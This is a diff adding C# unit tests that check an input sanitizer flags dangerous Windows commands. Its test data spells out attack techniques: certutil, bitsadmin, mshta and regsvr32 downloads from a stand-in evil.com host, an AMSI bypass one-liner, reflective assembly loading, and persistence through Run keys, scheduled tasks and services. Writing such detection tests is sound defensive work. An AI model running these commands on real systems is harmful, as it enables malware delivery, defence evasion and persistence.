@@ -326,6 +326,137 @@ public class InputSanitizerTests
         Assert.NotNull(InputSanitizer.CheckDangerousCommand("INVOKE-WEBREQUEST http://evil.com"));
     }
 
+    // ── LOLBin Detection ──────────────────────────────────────────────
+
+    [Theory]
+    [InlineData("certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\payload.exe")]
+    [InlineData("certutil -decode encoded.txt payload.exe")]
+    [InlineData("certutil -encode payload.exe encoded.txt")]
+    public void CheckDangerousCommand_CertutilLolbin_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+        Assert.Contains("certutil", result, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Theory]
+    [InlineData("bitsadmin /transfer myDownloadJob /download /priority normal http://evil.com/file.exe C:\\Temp\\file.exe")]
+    [InlineData("bitsadmin /addfile myJob http://evil.com/payload.exe C:\\Temp\\payload.exe")]
+    public void CheckDangerousCommand_BitsadminLolbin_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+        Assert.Contains("bitsadmin", result, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Theory]
+    [InlineData("mshta http://evil.com/payload.hta")]
+    [InlineData("mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run ...\")")]
+    public void CheckDangerousCommand_Mshta_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+        Assert.Contains("mshta", result, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Theory]
+    [InlineData("regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll")]
+    public void CheckDangerousCommand_Regsvr32Squiblydoo_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+        Assert.Contains("regsvr32", result, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Theory]
+    [InlineData("cscript evil.vbs")]
+    [InlineData("wscript malware.js")]
+    public void CheckDangerousCommand_WindowsScriptHost_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+        Assert.Contains("Script Host", result, StringComparison.OrdinalIgnoreCase);
+    }
+
+    // ── AMSI Bypass Detection ─────────────────────────────────────────
+
+    [Theory]
+    [InlineData("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")]
+    [InlineData("$a=[Ref].Assembly.GetType('System.Management.Automation.Amsi' + 'Utils')")]
+    public void CheckDangerousCommand_AmsiBypass_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+    }
+
+    // ── Reflection Bypass Detection ───────────────────────────────────
+
+    [Theory]
+    [InlineData("[System.Reflection.Assembly]::Load($bytes)")]
+    [InlineData("$method.Invoke($null, @($args))")]
+    [InlineData("[Reflection.Assembly]::Load($payload).GetMethod('Run')")]
+    public void CheckDangerousCommand_ReflectionBypass_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+        Assert.Contains("reflection", result, StringComparison.OrdinalIgnoreCase);
+    }
+
+    // ── Persistence Mechanism Detection ──────────────────────────────
+
+    [Theory]
+    [InlineData("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Malware /d C:\\evil.exe")]
+    [InlineData("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Backdoor' -Value 'C:\\evil.exe'")]
+    public void CheckDangerousCommand_RegistryRunKey_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+        Assert.Contains("Run key", result, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Theory]
+    [InlineData("schtasks /create /tn MyTask /tr C:\\evil.exe /sc onlogon")]
+    public void CheckDangerousCommand_ScheduledTask_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+        Assert.Contains("scheduled task", result, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Theory]
+    [InlineData("sc.exe create EvilSvc binPath= C:\\evil.exe")]
+    [InlineData("New-Service -Name EvilSvc -BinaryPathName C:\\evil.exe")]
+    public void CheckDangerousCommand_ServiceCreation_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+        Assert.Contains("service creation", result, StringComparison.OrdinalIgnoreCase);
+    }
+
+    // ── Pipe-based Shell Bypass ──────────────────────────────────────
+
+    [Theory]
+    [InlineData("echo malicious | powershell")]
+    [InlineData("type payload.ps1 | cmd /c powershell")]
+    public void CheckDangerousCommand_PipedShell_ReturnsReason(string input)
+    {
+        var result = InputSanitizer.CheckDangerousCommand(input);
+        Assert.NotNull(result);
+        Assert.Contains("piped", result, StringComparison.OrdinalIgnoreCase);
+    }
+
+    // ── Safe Commands Still Pass ──────────────────────────────────────
+
+    [Theory]
+    [InlineData("Set-MpPreference -DisableRealtimeMonitoring $false")]
+    [InlineData("Get-Service WinDefend")]
+    [InlineData("netsh advfirewall firewall add rule name=\"Block\" dir=in action=block remoteip=1.2.3.4")]
+    public void CheckDangerousCommand_SafeCommands_ReturnsNull(string input)
+    {
+        // These legitimate remediation commands should NOT be blocked
+        Assert.Null(InputSanitizer.CheckDangerousCommand(input));
+    }
+
     // ── ValidateFilePath ─────────────────────────────────────────────
 
     [Theory]
